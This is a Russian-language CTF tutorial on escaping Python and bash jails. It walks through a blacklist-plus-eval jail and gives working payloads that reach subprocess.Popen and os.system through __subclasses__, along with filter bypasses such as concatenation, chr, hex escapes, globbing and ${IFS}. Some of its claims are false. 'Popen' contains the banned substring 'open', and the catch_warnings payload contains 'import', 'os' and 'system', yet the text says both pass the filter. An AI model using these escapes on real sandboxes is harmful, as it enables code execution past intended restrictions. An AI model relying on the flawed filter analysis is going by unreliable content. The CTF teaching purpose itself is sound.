## Вопрос, с которого всё начинается

Задача даёт сервис, который спрашивает строку и говорит, что исполнит её как Python-код. Но не всё: `import`, `os`, `open`, `system` запрещены — их ловит чёрный список. Как выполнить команду, если «опасные» слова заблокированы?

## Наш пример: pyjail с чёрным списком

В условии лежит исходник джейла:

```python
blacklist = ['import', 'os', 'subprocess', 'open', 'eval', 'exec', 'system']
code = input()
for b in blacklist:
    assert b not in code
eval(code)
```

Читаем внимательно. Джейл берёт ввод, проверяет, что в строке нет ни одного запрещённого слова, и вызывает `eval`. Задача — выполнить `cat /flag`, не используя ни одного из запрещённых слов.

## Шаг 1: составляем карту запретов

Первое действие при любой джейл-задаче — прочитать исходник и выписать, что именно фильтруется. Здесь запрещены подстроки: `import`, `os`, `subprocess`, `open`, `eval`, `exec`, `system`. Заметьте: `eval` **запрещено в тексте**, но само `eval(code)` вызывается самим джейлом — значит, наш ввод исполняется как Python.

Ключевая мысль: побег почти всегда идёт через то, что **разрешено**, но имеет доступ к запрещённому. Нам нужно найти объект или функцию, которые могут выполнить команду, не содержа в имени запрещённых слов.

## Шаг 2: объектная модель Python

В Python всё — объект, и у каждого объекта есть «родословная». Через неё можно добраться до любых классов, загруженных в интерпретатор. Начнём с пустого кортежа:

```python
print(().__class__.__base__.__subclasses__())
```

- `().__class__` — класс пустого кортежа, `tuple`;
- `.__base__` — его базовый класс, `object`;
- `.__subclasses__()` — список **всех** классов, унаследованных от `object`.

В этом списке есть и `subprocess.Popen`, и другие полезные классы. Это и есть «дыра»: рефлексия даёт доступ к нативному слою.

## Шаг 3: строим payload

Найдём `Popen` в списке и вызовем его:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Popen'][0]('cat /flag', shell=True)
```

Проверяем: встречается ли запрещённая подстрока? `subprocess` — нет, мы искали класс по имени `Popen`. `os` — нет. `open` — нет (это `Popen`). `system` — нет (`shell=True`). Фильтр пропускает payload, а команда исполняется.

Если в списке нет `Popen`, идём через `warnings.catch_warnings` — у этого класса есть `__init__.__globals__`, откуда достаются builtins:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /flag')
```

Здесь `__import__` (с подчёркиваниями) не запрещён — чёрный список ловил только `import`. Такая мелочь и открывает побег.

## Шаг 4: обход текстового фильтра

Если запрещены и `__import__`, и `builtins`, собираем слова динамически. Например, запрещено `os` — берём его по буквам:

```python
getattr(__builtins__, 'op'+'en')('/flag').read()
```

Конкатенация `'op'+'en'` не содержит подстроки `open`. Так же собирают `'o'+'s'`, `'s'+'ystem'`. Другие приёмы:

- `chr(111)+chr(115)` — символы по кодам;
- `getattr(obj, 'x')` вместо `obj.x`;
- `\x6f\x73` — hex-escape.

Смысл один: строковый фильтр обходится, если не писать запрещённое слово буквально.

## Шаг 5: проверяем локально

Payload нужно отладить, а не отправлять вслепую. Соберите джейл у себя:

```
$ python3 -c "blacklist=['import','os']; code=input(); [__import__('sys').exit(1) for b in blacklist if b in code]; eval(code)"
```

Подайте payload и посмотрите на traceback — он подсказывает, какие имена доступны и где ошибка. `strace` покажет, какие системные вызовы реально происходят.

## Шаг 6: bash-джейлы

В bash-джейле обычно ограничивают команды и символы. Наш пример — запрещён `cat` и пробелы. Приёмы:

- **globbing:** `/???/??t /????` — `?` совпадает с любым символом, так находят `cat` и файл;
- **переменные:** `a=cat; $a /flag`;
- **подстановка:** `$(cat /flag)`;
- **`${IFS}`** вместо пробела: `cat${IFS}/flag`;
- **экранирование:** `c\at /fl\ag`.

Например, если запрещён `cat`, читаем файл другой утилитой: `head`, `less`, `sed`, `od`, `awk` — все они умеют выводить содержимое.

## Шаг 7: если не сработало

- **Ограничение длины.** Упакуйте payload в hex/base64 и распакуйте через `exec`.
- **`eval` заменён на `exec`.** `exec` принимает операторы — это даже удобнее.
- **Вывод не возвращается.** Спрячьте данные в исключении: `raise Exception(open('/flag').read())`.
- **Аудит-хук перехватывает `open`.** Ищите непокрытые примитивы: `os.popen`, `ctypes`, уже импортированные модули.
- **Версия языка другая.** `getfenv` есть в Lua 5.1, но не в 5.2+ — проверяйте версию.

## Полный прогон от начала до конца

Соберём побег в одну историю:

1. Читаем исходник джейла, выписываем запреты: `import`, `os`, `open`, `system`.
2. Проверяем, что доступно: `getattr`, `chr`, скобки.
3. Строим путь к классам: `().__class__.__base__.__subclasses__()`.
4. Ищем `Popen` или `catch_warnings` в списке.
5. Вызываем команду через найденный класс — в payload нет запрещённых подстрок.
6. Если фильтр ловит `__` — собираем имена через `chr(95)` и `getattr`.
7. Проверяем локально, читаем traceback, при необходимости ужимаем payload.

Каждый пункт — ответ на конкретный запрет. Так задача «обойти фильтр» превращается в список маленьких вопросов, а не в угадывание.

## Что мы теперь знаем

По-простому:

1. Джейл — это фильтр поверх интерпретатора; побег идёт через незаблокированный путь.
2. Сначала читаем исходник и выписываем список запретов.
3. В Python рефлексия (`__subclasses__` → `__globals__` → `__builtins__`) даёт доступ к нативному слою.
4. Текстовые фильтры обходятся конкатенацией, `getattr`, `chr`, hex.
5. В bash работают globbing, переменные, `${IFS}` и альтернативные утилиты.

## На что смотреть дальше

- **Фильтр по подстрокам** — обходится конкатенацией и кодировкой.
- **Забыть про альтернативные функции** — `popen`, `spawn`, `ctypes`.
- **Не проверить версию языка** — приёмы различаются между версиями.
- **Игнорировать traceback** — он раскрывает доступные имена.
- **Слишком длинный payload** — сжимайте или используйте переменные.
